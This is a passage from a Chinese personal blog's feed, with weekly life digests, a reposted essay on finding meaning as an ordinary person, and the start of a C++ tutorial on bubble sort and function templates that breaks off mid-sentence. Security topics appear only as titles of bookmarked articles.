    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>吴亦凡被锤，让子弹飞一会。</li><li>河南遇千年一遇大雨，平均降水量超 200 毫米，郑州受灾严重，铁路全部停运。风雨中，我们守望相助，希望前方人民平安！也感谢所有在天灾前伸出援手的人，你们都是英雄，希望你们都能平安归来！</li><li>东京奥运会即将开幕，日本无力吐槽，整活一套一套的。</li><li>世界最快磁悬浮在青岛试车成功。</li><li>南京机场爆发疫情，南大夏令营改为线上。</li><li>河南卷烟厂也上热搜了</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>又来上海了，希望如愿以偿！</li><li>上海物价真的高，风比青岛还大，云也超大</li><li>下雨天不要骑共享单车！</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ol><li>深度包检测技术介绍_吃素的小动物的博客-CSDN 博客<a href="https://blog.csdn.net/weixin_30654419/article/details/96930279">https://blog.csdn.net/weixin_30654419/article/details/96930279</a></li><li>机器学习在网络流量分类中的应用_dieTicket 的博客-CSDN 博客<a href="https://blog.csdn.net/dieTicket/article/details/106869766">https://blog.csdn.net/dieTicket/article/details/106869766</a></li><li>HTTPS 到底有多复杂，能防止重放攻击吗？ - 知乎<a href="https://zhuanlan.zhihu.com/p/360782536">https://zhuanlan.zhihu.com/p/360782536</a></li><li>P2P 网络及节点发现机制_qukuai 的博客-CSDN 博客_p2p 节点<a href="https://blog.csdn.net/qukuai/article/details/81082421">https://blog.csdn.net/qukuai/article/details/81082421</a></li><li>b+树时间复杂度_leetCode. 二叉搜索树专题(4)_weixin_39598941 的博客-CSDN 博客<a href="https://blog.csdn.net/weixin_39598941/article/details/110570255?utm_medium=distribute.wap_relevant.none-task-blog-baidujs_baidulandingword-1">https://blog.csdn.net/weixin_39598941/article/details/110570255?utm_medium=distribute.wap_relevant.none-task-blog-baidujs_baidulandingword-1</a></li><li><a href="https://mp.weixin.qq.com/s/Gb9SW0Sl63xbQ21pSY_JOg">老生常谈的无字母数字 Webshell 总结</a></li><li><a href="https://mp.weixin.qq.com/s/SWCj9CXOWbkny0A35Lagow">恶意代码流量分析与监测</a></li></ol><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><p>追了哪些剧？<br>-_-哪有时间</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><ol><li>来自《觉醒时代》</li></ol><p>我们中国人，思想、性格，有很多的弱点，<br>但是，在我们中国人身上，有其他任何民族都没有的、难以言喻的东西，<br>那就是温良。<br>温良，不是温顺，更不是懦弱，<br>温良是一种力量，是一种同情和人类智慧的力量。<br>大灾面前，更显真情。振臂一呼，无数援手。<br>河南挺住！国家和人民都在你们的身后！</p><ol start="2"><li>来自《千与千寻》</li></ol><p>不管前方的路有多苦，只要走的方向正确，都比站在原地更接近幸福。</p><ol start="3"><li>最清晰的脚印，踩在最泥泞的路上。</li><li>无论风暴将我带到什么岸边，我都将以主人的身份上岸。</li><li>自律且努力，别让生活太安逸。</li><li>不要因为走得太快，而忘记为什么出发。–纪伯伦</li><li>满怀希望就会所向披靡。</li><li>不做准备，就是在准备失败。–富兰克林</li><li>生活，就是昂首前瞻。</li><li>感恩努力每个追寻的瞬间，我们找到彼此也和自己相认。</li></ol><p>​</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>pitch–好看简洁的在线 ppt 制作网站</li><li><a href="https://www.cnblogs.com/llfy/p/9405120.html">堆和栈的区别</a></li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>无论人生上到哪一层台阶，阶下有人在仰望你，阶上亦有人在俯视你。你抬头自卑，低头自得，唯有平视，才能看见真正的自己。</li><li>愿你的未来纯净明朗，像你此刻可爱的目光。在世间美好的命运中，愿你的命运美好欢畅。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;吴亦凡被锤，让子弹飞一会。&lt;/li&gt;
&lt;li&gt;河南遇千年一遇大雨，平均降水量超 200 毫米，郑州受灾严重，铁路全部停运。风雨中</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>一个平凡人的自述</title>
    <link href="https://www.blog.hackerjerry.top/2021/07/11/%E4%B8%80%E4%B8%AA%E5%B9%B3%E5%87%A1%E4%BA%BA%E7%9A%84%E8%87%AA%E8%BF%B0_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/07/11/%E4%B8%80%E4%B8%AA%E5%B9%B3%E5%87%A1%E4%BA%BA%E7%9A%84%E8%87%AA%E8%BF%B0_new/</id>
    <published>2021-07-11T03:15:57.000Z</published>
    <updated>2021-11-14T09:18:01.636Z</updated>
    
    <content type="html"><![CDATA[<p>tags: [知乎]<br>categories: [随笔]<br>index_img: “<a href="https://image.hackerjerry.top/dddd-3.jpg&quot;">https://image.hackerjerry.top/dddd-3.jpg&quot;</a><br>​</p><hr><p><strong>一个平凡人，活着的意义是什么呢？</strong></p><p>我没有很好的外表，也没有可以挥霍的资本，从小到大一直都普普通通。<br>​</p><p>在人前一般都很安静，给人看起来不善言谈的样子。个人很独立，自己的事情尽量自己完成。从不主动去和异性搭话或是帮忙，也很少去表现自己，在人群中永远都是小透明。<br>​</p><p>消息总是群聊、公众号发来的信息，时常觉得是自己做的不够好，长得不好看。内心很敏感，有时别人一句无心的话，可能会使自己郁闷一整天。<br>​</p><p>和别人说话总是很温柔，难过的事情自己扛，不太希望别人干扰我的生活，听歌听一晚、睡起来还是新的一天。在灯火通明的夜里，无聊的看星星和月亮落下，每天都是循环如此。<br>​</p><p>每当有人问起，为什么我不恋爱的时候，我总以麻烦为理由搪塞过去。<br>​</p><p>朋友和我说，或许是你还没遇见真正喜欢的人吧，我却没法开口告诉他们。其实我遇见过，只是遇见得过早，以至于我还没来得及弄清楚，就弄丢了。<br>​</p><p>在二十多年的平淡日子里，既没能成为自己的月亮，又一事无成，惊艳不了谁的岁月。<br>​</p><p>那么平凡的我，活着的意义是什么？<br>​</p><p>日你妈，我偏爱自己骨子里的那份冷清，生性安静，但也孤傲，遵从自己的内心。<br>​</p><p>我脚下的影子从来不肯试着像谁，直抒胸臆我也不曾受谁气受。<br>​</p><p><strong>我对美好生活的向往，就是我活着的意义。</strong><br>​</p><p>我想努努力，赚点小钱，然后实现经济独立，去做些自己想做的事。</p><p>去爬一次雪山，去感受千山鸟飞绝，万径人踪灭。去感受自然的伟大和雄伟瑰丽，去挑战自我。<br>​</p><p>去草原骑一次大马，看野花被风吹起，牛羊奔息，草原就像是落了一场急雨。草叶翻滚，踩上去就会有咯吱咯吱的淅沥与轻柔。<br>​</p><p>去边远的乡村旅行。傍晚的风很轻，天空挂着洁白的云，在小镇古朴的石桥上，牵着大狗儿慢悠悠地走在落日的大道。<br>​</p><p>我还想去写故乡的月亮，弥补对家人的亏欠，为自己不懂事的过往道歉，原谅自己人生的缺憾。<br>​</p><p>那时的天空很蓝很近，晚霞晕染在天边，村庄散出一圈又一圈的白烟。我和女孩站在长满栗子的老树下，轻轻地敲打着秋天。<br>​</p><p>我现在想去遇见能分享心情的人。看月光淡淡地爬上树梢，抓住平淡日子里的小确幸，在心里种下一株向阳而生的花儿，比一切美酒都要芬芳。<br>​</p><p>有人问一个平庸的人，活着的意义是什么？其实无论多么波澜壮阔的生命，最终都要归于平淡的柴米油盐与尘土，我感谢自己卑微而鲜活地活着。<br>​</p><p>有人说活着很累，其实吧，我也没吃过什么生活的苦。此生有幸，受家人疼爱，朋友照顾，而我不快乐的原因多数只是自己放大了，一些人生中的小挫折失败罢了。<br>​</p><p>生活中总会有很多平常的快乐可以沉溺其中。比如每天吃到的好吃东西，与朋友分享的有趣片段；洗完了积攒许久的衣服，收获来自陌生人的夸赞与关心；在温柔的日落下，去小区楼下喂养流浪的小猫，任其在怀里撒泼打滚。<br>​</p><p>生活本就由零散的碎片组成，有时鸡飞狗跳，有时轻松欢愉。如果愿意用最细腻的情感，去体验那些包裹在烟火里的平凡琐碎，就会从中收获到新的柔软与感动。如果感到不快乐的时候，可能只是我们把重心放错了地方，不必在一件事上停留太久。<br>​</p><p><strong>生活原本苦闷，但跑起来就会生风。</strong><br><strong>​</strong></p><blockquote><p>这是知乎答主<a href="https://www.zhihu.com/people/you-nei-han-de-shi-ni-yao-a">吹面不寒</a>的一篇回答，我很喜欢，这世界有很多相似的人，虽然成长的环境各不相同，但却塑造成了相似的人，我从他的回答里看到了自己的影子，可以说世另我！<br>所以说，像我们这样平凡的人，既然并不出色，那么就把手里的事情做好，就够了。既然成为不了别人的月亮，也温柔不了别人的时光，那么就好好的爱自己，好好的爱家人，对朋友也真心付出，好好的健身，去提升自己，无论内在或者外在。<br>追逐日月，不苟于山川。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;tags: [知乎]&lt;br&gt;categories: [随笔]&lt;br&gt;index_img: “&lt;a href=&quot;https://image.hackerjerry.top/dddd-3.jpg&amp;quot;&quot;&gt;https://image.hackerjerry.top/dddd</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>生活周报-June-28-to-July-4</title>
    <link href="https://www.blog.hackerjerry.top/2021/07/02/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-28-to-July-4_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/07/02/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-28-to-July-4_new/</id>
    <published>2021-07-02T11:07:48.000Z</published>
    <updated>2021-11-14T09:12:26.064Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>7 月 1 日，中国共产党百年华诞。</li><li>中国男足进入世界杯亚洲 12 强</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>期末考试结束。</li><li>暑期复习开始。</li><li>西安大雨，又一次落汤鸡。</li><li>西交的优营没拿到，入 66 就给了 15 个，真醉了。</li><li>开始早起健身，不碰手机，杜绝流视频平台（包括 b 站，好友热播等），不看 qq 动态。</li><li>开始 12 点之前上床，上床前定好闹钟，上床不看手机。</li><li>​</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p>【1】：<a href="https://mp.weixin.qq.com/s/Ic70dj7FSmDHGKTsekjhGQ">Kerberos 协议相关安全问题分析与利用</a><br>【2】：<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==%E2%88%A3=2247497760&idx=1&sn=4c0f57ba9203cc115a85cd0c011fdc43&chksm=ec1cad1fdb6b2409ec3ef25008ad6834a7220997a914308a478ed9d682c84c7b370e423a878c&scene=21#wechat_redirect">Kerberos 协议与 Kerberos 认证原理</a><br>【3】：<a href="https://mp.weixin.qq.com/s/_aeUWSfK4Igi_dAAJlvEww">隐秘的印记：暗水印实践技术分享</a><br>【4】：<a href="https://mp.weixin.qq.com/s/aIIP4qjtkGd1Houaq0cpdw">使用 Caronte 在 CTF 比赛中完成网络流量分析</a><br>《自控力》–节省决策成本</p><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><p>追了哪些剧？</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><ol><li>你若在场，看着繁华盛世，多好。</li></ol><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-28-to-July-4-1.jpeg#clientId=ue0601b88-cb5c-4&from=drop&height=347&id=u8745ea97&margin=%5Bobject%20Object%5D&name=1625225828093.jpg&originHeight=1080&originWidth=2400&originalType=binary%E2%88%B6=1&size=327540&status=done&style=none&taskId=uba156795-0383-4e11-9261-6891a96e69a&width=772" alt="1625225828093.jpg"></p><ol start="2"><li>万事藏于心而不表于情，花开两朵，天各一方，追赶日月，不苟于山川。</li><li>世态人情，可当书读，可当戏看，有缘无份，好聚好散。</li><li><strong>今天我请客，请你快乐</strong>。</li><li>那些你做了所有努力也没有在一起的人，都不是对的人。</li><li>道德是用来律己的，不是用来责人的。道德是用来躬行实践的，不是在嘴里头空喊的。–李大钊</li><li>我知道月光不会为我停留，也知道夏风永远短暂，可我仍会为那零星光亮奋力奔跑。</li><li>如今的社会风气啊，越来越苟且敷衍，只顾眼前，道德伦丧、败坏德行的事情，触目皆是，不是德行根基牢固的人，少有不被这种社会风气所污染。各位，国家的兴衰，要看社会风气是高尚还是低劣，如果都流行于这种社会风气，前途不堪设想，所以要有卓越之人，以身作则，尽力去矫正这种颓废的社会风气。<strong>诸君皆为大学学生，地位甚高，肩此重任，责无旁贷。如果德不修、学不讲，还与这种颓废的社会风气同流合污，那亦是侮辱自己，更何谈，做他人的榜样呢</strong>？所以，<strong>品行不可以不严谨对待和修养</strong>，这是我希望于诸君者之二。——蔡元培</li></ol><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><h3 id="健身"><a href="#健身" class="headerlink" title="健身"></a>健身</h3><blockquote><p>来自过来人的建议–从 125 斤到 165 斤</p></blockquote><ol><li>坚持，做任何事情都要坚持，健身也不例外。</li><li>一定要学好基础动作。</li><li>统计数据。吃了多少蛋白质，训练动作做了多重次数多少，肌肉酸疼感觉。</li><li>休息一定要安排好。</li><li>训练复盘<blockquote><p>关于饮食</p></blockquote></li></ol><p>碳水：蛋白质：油脂=6：3：1<br>一周三到四练，以三大项为主，先练大肌肉群，用大重量。肩和手臂用小重量多次，保证动作质量。（每天 30 分钟左右）<br>什么样的碳水呢？<br>米饭、玉米、土豆、馒头、面包等</p><blockquote><p>越跑肉掉的越多，有氧运动消耗太大。</p></blockquote><h3 id="摄影"><a href="#摄影" class="headerlink" title="摄影"></a>摄影</h3><p>新关注了一个 up 主，用的索尼 6400，配的适马 2000</p><h3 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h3><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-28-to-July-4-2.jpeg#clientId=ue0601b88-cb5c-4&from=drop&height=960&id=u2ba33ffe&margin=%5Bobject%20Object%5D&name=1625226567307.jpg&originHeight=2400&originWidth=1080&originalType=binary%E2%88%B6=1&size=516869&status=done&style=none&taskId=u4ec4a1b9-ac12-467c-b283-d5d7f5e5c1b&width=432" alt="1625226567307.jpg"></p><ol><li>练就有神眼睛</li><li>如何以尽可能低的价钱买东西？</li></ol><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-28-to-July-4-3.jpeg#clientId=ue0601b88-cb5c-4&from=drop&height=1089&id=u821bc7fd&margin=%5Bobject%20Object%5D&name=1625226731433.jpg&originHeight=2400&originWidth=1080&originalType=binary%E2%88%B6=1&size=544277&status=done&style=none&taskId=u7cb492fc-4d99-4228-a464-fefb2b8c445&width=490" alt="1625226731433.jpg"></p><ol start="3"><li>填什么东西，申请表之类的，交上之前拍照或者复制一份在手里，以备不时之需。</li><li>学会说话</li></ol><p>把“谢谢”改成“<strong>谢谢你</strong>”<br>把“随便”改成“<strong>听你的</strong>”<br>把“听明白了吗”改成“<strong>我说明白了吗</strong>”<br>把“我尽量”改成“<strong>我全力以赴</strong>”</p><ol start="5"><li><strong>最困难的事情，在早晨完成，不要第一时间看手机！</strong></li><li>如何养成良好的坐姿</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>关于为何没有拿到西交的优秀营员，我回想了一下，应该是回答踩雷太多了。</li><li>酒后吐真言未必是真的，只是他想让你这么相信罢了，具体还是要看他干了什么事。</li><li>你付出信任，就会收获信任；你给出赞美，就会收获支持。生命，是一种回声。</li><li>关于认清自己，学姐是这么说的：<strong>静下心来，整理自己所获得的成就，回顾自己以往的失败案例，去对比，去排除。</strong></li></ol><p><strong>​</strong></p><p><strong>我们始终在认识自己的道路上前进，这条路不太好走，迷雾很多，干扰也有很多，稍不留神，我们就迷失了。</strong><br><strong>​</strong></p><p><strong>但是我们应该做的，就是要认清自己想要什么，自己正在干什么，自己还有哪些不足要去弥补，就够了。人无完人，不必陷入对他人的焦虑之中，面对自己，每天进步，无愧于心就好。</strong></p><ol start="5"><li>关于做学问和读书，觉醒年代中是这么说的：</li></ol><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-28-to-July-4-4.jpeg#clientId=ue0601b88-cb5c-4&from=drop&id=u94f210ad&margin=%5Bobject%20Object%5D&name=N7536JW%29%404DFBR5S7M92%7BOA.jpg&originHeight=965&originWidth=720&originalType=binary%E2%88%B6=1&size=102821&status=done&style=none&taskId=uc64ab375-fe33-44cb-af56-dc3efbdbce1" alt="N7536JW)@4DFBR5S7M92{OA.jpg"><br>​</p><p>百年前，北大学子中是这样对待学问的，“平时冶游，考试来了，才去翻读讲义”“不问学术之有无，唯争分数之多寡，考试结束，书籍束之高阁，毫不过问。”如今的我们，似乎并无二致。平日上课，草草应付，课前预习、课后复习的好习惯早已抛掷脑后，临了考试，靠老师的重点过活，力求高分，卷绩点，却没有将知识的深度延伸，考完再不过问，何谈科教兴邦，何谈科教兴国，培养出一群只会考试的人，如何学以致用，弥补差距？</p><ol start="6"><li>来自教员年轻的时候说的话：<strong>这是一个浮躁的社会，只有自律的人，才有可能脱颖而出，成就大事。</strong></li></ol><p>教员在天之灵，看到这锦绣山河，想必也会欣慰的。<br><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-28-to-July-4-5.jpeg#clientId=ue0601b88-cb5c-4&from=drop&id=uda969225&margin=%5Bobject%20Object%5D&name=1625225893756.jpg&originHeight=1079&originWidth=720&originalType=binary%E2%88%B6=1&size=73415&status=done&style=none&taskId=u72567956-30d5-4e5b-9f3e-4ffe4896e22" alt="1625225893756.jpg"><br>​</p><p>生逢盛世，我辈有幸迎接中国共产党百年华诞。回首来路，何其艰辛，何其波澜壮阔，何其光华璀璨。中国共产党人一直把为中国人民谋幸福，为中华民族谋复兴作为自己的初心和使命，不畏艰险，不畏牺牲，百折不挠。是中国共产党带领中国人民创造了新民主主义革命的伟大成就，是中国共产党带领中国人民推翻了帝国主义、封建主义、官僚资本主义三座大山，是中国共产党带领中国人民建立了人民当家作主的中华人民共和国。<br>​</p><p>为了实现中华民族的伟大复兴，中国共产党人代代接力，书写奇迹。从一穷二白的小农经济，到充满活力的市场经济体制，中国取得了全面小康的伟大成绩。从第一部社会主义宪法的颁布，再到建成较为完善的社会主义法律法规体系，社会主义没有辜负中国，中国也没有辜负社会主义！<br>​</p><p>百年长路，感慨万千。一百年来，无数的中国共产党人坚守理想担当，坚守初心使命，为中华民族、中国人民做出不可磨灭的贡献，他们为祖国和民族建立的丰功伟绩将永载史册，他们为人民创造的辉煌成就将流芳百世。<br>​</p><p>何其有幸，我们生在红旗下，长在春风里。<br>​</p><p>请党放心，强国有我！<br>​</p><p>![F4GS34SAG7JKNC<del>L62G`3</del>5.jpg](<a href="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-28-to-July-4-6.jpeg#clientId=ue0601b88-cb5c-4&amp;from=drop&amp;id=u7d6e35df&amp;margin=%5Bobject%20Object%5D&amp;name=F4GS34SAG7JKNC~L62G%603~5.jpg&amp;originHeight=909&amp;originWidth=720&amp;originalType=binary%E2%88%B6=1&amp;size=103712&amp;status=done&amp;style=none&amp;taskId=u3006c74d-22cc-4600-86bb-1ffb72cf71b">https://image.hackerjerry.top/生活周报-June-28-to-July-4-6.jpeg#clientId=ue0601b88-cb5c-4&amp;from=drop&amp;id=u7d6e35df&amp;margin=%5Bobject%20Object%5D&amp;name=F4GS34SAG7JKNC~L62G%603~5.jpg&amp;originHeight=909&amp;originWidth=720&amp;originalType=binary∶=1&amp;size=103712&amp;status=done&amp;style=none&amp;taskId=u3006c74d-22cc-4600-86bb-1ffb72cf71b</a>)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;7 月 1 日，中国共产党百年华诞。&lt;/li&gt;
&lt;li&gt;中国男足进入世界杯亚洲 12 强&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>排序</title>
    <link href="https://www.blog.hackerjerry.top/2021/06/18/%E6%8E%92%E5%BA%8F_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/06/18/%E6%8E%92%E5%BA%8F_new/</id>
    <published>2021-06-18T07:20:40.000Z</published>
    <updated>2021-11-14T09:11:42.684Z</updated>
    
    <content type="html"><![CDATA[<p>把各类排序做一遍梳理。</p><a id="more"></a><h1 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//bubble sort</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num[])</span></span>&#123;<br>    <span class="hljs-keyword">int</span> length = <span class="hljs-keyword">sizeof</span>(num)/<span class="hljs-keyword">sizeof</span>(num[<span class="hljs-number">0</span>]);<span class="hljs-comment">//获取数组长度</span><br>    <span class="hljs-keyword">int</span> temp;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i  = <span class="hljs-number">0</span>;i &lt; length<span class="hljs-number">-1</span>; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j&lt; length<span class="hljs-number">-1</span>-i; j++)&#123;<span class="hljs-comment">//注意这里，每一轮j比前一轮到达的位置递减</span><br>            <span class="hljs-keyword">if</span>(num[j] &gt; num[j+<span class="hljs-number">1</span>])&#123;<br>                temp = num[j];<br>                num[j] = num[j+<span class="hljs-number">1</span>];<br>                num[j+<span class="hljs-number">1</span>] = temp;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>双层循环，时间复杂度是 O(n2)。</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p><strong>比如说给你一个有序的数组，或者是部分有序的数组，你怎么把它的运行时间降下来</strong><br>我们可以设置一个标记位，如果在某一轮中从来没有交换过前后两个数，我们认为此时就已经有序了，没必要再进行之后的循环了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> length = <span class="hljs-keyword">sizeof</span>(num)/<span class="hljs-keyword">sizeof</span>(num[<span class="hljs-number">0</span>]);<span class="hljs-comment">//注意，计算数组长度必须要在main函数里面，而不能将num做参数传递之后再计算。</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">OptimizeSort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num[],<span class="hljs-keyword">int</span> length)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> temp;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; length - <span class="hljs-number">1</span> ; i++)&#123;<br>        <span class="hljs-keyword">bool</span> flag = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; length - <span class="hljs-number">1</span> -i; j++)&#123;<br>            <span class="hljs-keyword">if</span>(num[j] &gt; num[j+<span class="hljs-number">1</span>])&#123;<br>                temp = num[j];<br>                num[j] = num[j+<span class="hljs-number">1</span>];<br>                num[j+<span class="hljs-number">1</span>] = temp;<br>                flag = <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>          <span class="hljs-keyword">if</span>(flag)&#123;<span class="hljs-comment">//经过一轮后，flag标志没有改变，说明有序，可以退出循环</span><br>              <span class="hljs-keyword">break</span>;<br>          &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当将数组作为实参传递到另一个函数中时, 另一个函数的形参相当于一个指针变量, 因为将数组的名作为实参时, 就是<strong>将数字的首地址作为实参</strong>, 所以在 test 函数中输出的<strong>sizeof(arr)其实得到的是一个整型数组指针的长度</strong>(所占的字节数), 所以结果是 8, 再用其除以 int 所占的字节数(4), 结果就是 2。ps：这里 sizeof(&amp;arr)=8，sizeof(arr)=实际长度*4<br>要想用函数计算数组的长度，可以使用函数模板。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">count</span><span class="hljs-params">(T&amp; x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> s1 = <span class="hljs-keyword">sizeof</span>(x);<br>    <span class="hljs-keyword">int</span> s2 = <span class="hljs-keyword">sizeof</span>(x[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">int</span> result = s1 / s2;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> a[] = &#123; <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> &#125;;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; count(a);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>为什么可以呢？首先我们需要知道函数模板是什么。</p><h3 id="函数模板"><a href="#函数模板" class="headerlink" title="函数模板"></a>函数模板</h3><p><strong>函数模板不是一个实在的函数，编译器不能为其生成可执行代码。定义函数模板后只是一个对函数功能框架的描述，当它具体执行时，将根据传递的实际参数决定其功能。</strong><br>C++ 语言支持模板。有了模板，可以只写一个 Swap 模板，编译器会根据 Swap 模板自动生成多个 Sawp 函数，用以交换不同类型变量的值。<br>函数模板的写法如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> 类型参数1, <span class="hljs-title">class</span>类型参数2, ...&gt;</span><br><span class="hljs-class">返回值类型  模板名(形参表)</span><br><span class="hljs-class">&#123;</span><br>    函数体<br>&#125;<br></code></pre></td></tr></table></figure><p>具体示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">void</span> <span class="hljs-title">Swap</span>(<span class="hljs-title">T</span> &amp; <span class="hljs-title">x</span>, <span class="hljs-title">T</span> &amp; <span class="hljs-title">y</span>)</span><br><span class="hljs-class">&#123;</span><br>    T tmp = x;<br>    x = y;<br>    y = tmp;<br>&#125;<br></code></pre></td></tr></table></figure><p>就像这样，它用 T 代替了普通函数定义中的数据类型，代表一种泛化类型。<br>T 